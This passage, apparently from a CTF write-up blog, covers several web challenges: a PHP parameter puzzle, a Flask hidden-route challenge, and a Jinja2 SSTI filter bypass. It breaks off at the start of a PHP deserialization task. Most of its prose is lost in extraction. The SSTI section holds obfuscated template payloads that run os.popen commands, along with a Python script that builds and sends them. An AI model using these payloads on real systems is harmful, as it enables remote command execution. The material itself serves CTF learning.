punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><br>GET<br><code>?aaa=114514a&amp;bbb=114514b&amp;a=flag&amp;flag=a</code><br>POST<br><code>gdou[]=1&amp;ctf[]=2</code><br>COOKIE<br><code>cookie=j0k3r</code><br><img src="https://img-blog.csdnimg.cn/4a2c6f2e48e24be696a551a8aa9ca7fc.png" alt="3"></p><h3 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h3><p><strong></strong><br><br><img src="https://img-blog.csdnimg.cn/a8e1c77c98894795bc9d1f5ebfbc0d8e.png" alt="3"><br>&#x2F;src</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flaskapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_file<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/src'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_file<span class="token punctuation">(</span><span class="token string">'app.py'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/super-secret-route-nobody-will-guess'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'PUT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>/super-secret-route-nobody-will-guess</code>burpGETPUTflag<br><img src="https://img-blog.csdnimg.cn/f428cefb45aa4c01abc3e53ba9b68ffc.png" alt="5"></p><h3 id=""><a href="#" class="headerlink" title=""></a><ez_ze></h3><p><strong>pythonjinja2 SSTI</strong><br><br><img src="https://img-blog.csdnimg.cn/0c4046d1d8424ffba759b0ee71cfc198.png" alt="6"></p><p><code>&#123;&#123;&#125;&#125;</code></p><p><img src="https://img-blog.csdnimg.cn/d8a9ca545e6d41df9e13375ff8a2a8f4.png" alt="6"><br><img src="https://img-blog.csdnimg.cn/c5d8870ec29a4b3599c606cbff32dca9.png" alt="7"><br><img src="https://img-blog.csdnimg.cn/106cfa10d2934b5887fc065029a1886f.png" alt="8"><br>FUZZ<br><img src="https://img-blog.csdnimg.cn/6799efdd8ebf402abcbf0bce782a6c80.png" alt="9"></p><blockquote><p></p></blockquote><p><a href="https://blog.csdn.net/weixin_52635170/article/details/129856818"></a><br><br><img src="https://img-blog.csdnimg.cn/b1e9d4878b3142b1a1155b16fc9ee167.png" alt="1"><br><strong>payload</strong><br><a href="https://blog.csdn.net/Jayjay___/article/details/130186511">wp</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># : </span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> zero <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 0, lenght</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> one <span class="token operator">=</span> <span class="token punctuation">(</span>zero<span class="token operator">**</span>zero<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 1</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> two <span class="token operator">=</span> <span class="token punctuation">(</span>zero<span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">abs</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 2</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> four <span class="token operator">=</span> <span class="token punctuation">(</span>two<span class="token operator">*</span>two<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 4</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> five <span class="token operator">=</span> <span class="token punctuation">(</span>two<span class="token operator">*</span>two<span class="token operator">*</span>two<span class="token punctuation">)</span><span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token operator">-</span>one <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 5</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> three <span class="token operator">=</span> five<span class="token operator">-</span>one<span class="token operator">-</span>one <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 3</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> nine <span class="token operator">=</span> <span class="token punctuation">(</span>two<span class="token operator">*</span>two<span class="token operator">*</span>two<span class="token operator">*</span>two<span class="token operator">-</span>five<span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 9</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> seven <span class="token operator">=</span> <span class="token punctuation">(</span>zero<span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token operator">-</span>five<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">abs</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 7</span><span class="token comment"># : </span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> space <span class="token operator">=</span> self<span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">min</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># </span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> point <span class="token operator">=</span> self<span class="token operator">|</span><span class="token builtin">float</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">min</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># .</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>c<span class="token operator">=</span>aa<span class="token punctuation">)</span><span class="token operator">|</span>reverse<span class="token operator">|</span>first <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment">#  c</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> bfh <span class="token operator">=</span> self<span class="token operator">|</span>string<span class="token operator">|</span>urlencode<span class="token operator">|</span>first <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment">#  %</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> bfhc <span class="token operator">=</span> bfh<span class="token operator">~</span>c <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># %c, %c~</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> slas <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>four<span class="token operator">~</span>seven<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># %c /</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> yin <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>three<span class="token operator">~</span>nine<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># %c '</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> xhx <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>nine<span class="token operator">~</span>five<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># %c _</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> right <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>four<span class="token operator">~</span>one<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># %c )</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> left <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>four<span class="token operator">~</span>zero<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># %c (</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> but <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>buil<span class="token operator">=</span>aa<span class="token punctuation">,</span>tins<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># builtins</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> imp <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>imp<span class="token operator">=</span>aa<span class="token punctuation">,</span>ort<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># import</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pon <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>po<span class="token operator">=</span>aa<span class="token punctuation">,</span>pen<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># popen</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> so <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>o<span class="token operator">=</span>aa<span class="token punctuation">,</span>s<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># os</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> ca <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ca<span class="token operator">=</span>aa<span class="token punctuation">,</span>t<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># cat</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> l <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>l<span class="token operator">=</span>aa<span class="token punctuation">,</span>s<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>           <span class="token comment">#ls     //&#123;%%0cset%0cls%0c=%0cdict(l=aa,s=dd)|join%0c%&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> flg <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>fl<span class="token operator">=</span>aa<span class="token punctuation">,</span>ag<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># flag</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> ev <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ev<span class="token operator">=</span>aa<span class="token punctuation">,</span>al<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># eval</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> red <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>re<span class="token operator">=</span>aa<span class="token punctuation">,</span>ad<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># read</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> bul <span class="token operator">=</span> xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>but<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># __builtins__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> ini <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ini<span class="token operator">=</span>aa<span class="token punctuation">,</span>t<span class="token operator">=</span>bb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># init</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> glo <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>glo<span class="token operator">=</span>aa<span class="token punctuation">,</span>bals<span class="token operator">=</span>bb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># globals</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> itm <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ite<span class="token operator">=</span>aa<span class="token punctuation">,</span>ms<span class="token operator">=</span>bb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># items</span><span class="token comment">#  __import__('os').popen('cat /flag').read(): </span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pld <span class="token operator">=</span> xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>imp<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>left<span class="token operator">~</span>yin<span class="token operator">~</span>so<span class="token operator">~</span>yin<span class="token operator">~</span>right<span class="token operator">~</span>point<span class="token operator">~</span>pon<span class="token operator">~</span>left<span class="token operator">~</span>yin<span class="token operator">~</span>ca<span class="token operator">~</span>space<span class="token operator">~</span>slas<span class="token operator">~</span>flg<span class="token operator">~</span>yin<span class="token operator">~</span>right<span class="token operator">~</span>point<span class="token operator">~</span>red<span class="token operator">~</span>left<span class="token operator">~</span>right <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token comment"># SSTIpayload: </span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> f<span class="token punctuation">,</span>v <span class="token keyword">in</span> <span class="token punctuation">(</span>whoami<span class="token operator">|</span>attr<span class="token punctuation">(</span>xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>ini<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>glo<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>itm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># globals</span>    <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> f <span class="token operator">==</span> bul <span class="token operator">%</span><span class="token punctuation">&#125;</span>         <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> a<span class="token punctuation">,</span>b <span class="token keyword">in</span> <span class="token punctuation">(</span>v<span class="token operator">|</span>attr<span class="token punctuation">(</span>itm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># builtins</span>            <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> a <span class="token operator">==</span> ev <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># eval</span>                <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">(</span>pld<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token comment"># eval("__import__('os').popen('cat /flag').read()")</span>                <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>            <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">></span><span class="token keyword">from</span> typing <span class="token keyword">import</span> List<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://node6.anna.nssctf.cn:28298/get_flag"</span><span class="token comment">#</span><span class="token keyword">def</span> <span class="token function">build_number</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>result<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>index<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> num <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>n<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> num <span class="token operator">%</span> <span class="token number">10</span>result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num2var<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'*ten'</span><span class="token operator">*</span>index<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>num <span class="token operator">//=</span> <span class="token number">10</span>index <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">return</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>num2var_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">"zero"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"one"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"two"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"three"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"four"</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">"five"</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">"six"</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">"seven"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">"eight"</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">"nine"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">num2var</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span><span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span><span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"no way"</span><span class="token punctuation">)</span><span class="token keyword">return</span> num2var_dict<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set one=(a,)|length %&#125;&#123;% set zero=one-one %&#125;&#123;% set two=one+one %&#125;&#123;% set three=one+two %&#125;&#123;% set four=two*two %&#125;&#123;% set five=three+two %&#125;&#123;% set six=three*two %&#125;&#123;% set seven=one+six %&#125;&#123;% set eight=four*two %&#125;&#123;% set nine=one+eight %&#125;&#123;% set ten=five*two %&#125;&#123;% set pops=dict(p=a,op=a)|join %&#125;&#123;% set lo=(x|reject|string|list)|attr(pops)("""</span> <span class="token operator">+</span> build_number<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")%&#125;&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;&#123;% set cc=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;&#123;% set ccc=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;&#123;% set cccc=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;&#123;% set evas=dict(ev=a,al=a)|join %&#125;&#123;% set chs=dict(ch=a,r=a)|join %&#125;&#123;% set chr=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(chs)%&#125;&#123;% set eval=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(evas) %&#125;&#123;% print(eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>build_number<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string-interpolation"><span class="token string">f"__import__('os').popen('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').read()"</span></span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join)) %&#125;"""</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment">#return re.findall(f"h3>(.*?)&lt;/h3", response.text, re.S)[0].strip()</span>c <span class="token operator">=</span> <span class="token string">'cat /flag'</span><span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><img src="https://img-blog.csdnimg.cn/4da968b7349444ea8c30fc873afc897b.png" alt="2"><br><br><img src="https://img-blog.csdnimg.cn/c3c7b6d968f244bc82946f267069f729.png" alt="2"><br>test.txt<br><img src="https://img-blog.csdnimg.cn/70c0495b610441e1b57c98ffdc32e62a.png" alt="3"><br>php<br><a href="http://www.rar/">www.rar</a><br><img src="https://img-blog.csdnimg.cn/0fe65ed76dc94d7e8465f8d472870158.png" alt="6"><br>burp<br><img src="https://img-blog.csdnimg.cn/2dd20719f6054e4b8b4d753112d67505.png" alt="7"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// flag.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">teacher</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$salary</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$rank</span><span class="token punctuation">,</span><span class="token variable">$salary</span> <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">=</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">salary</span> <span class="token operator">=</span> <span class="token variable">$salary</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token 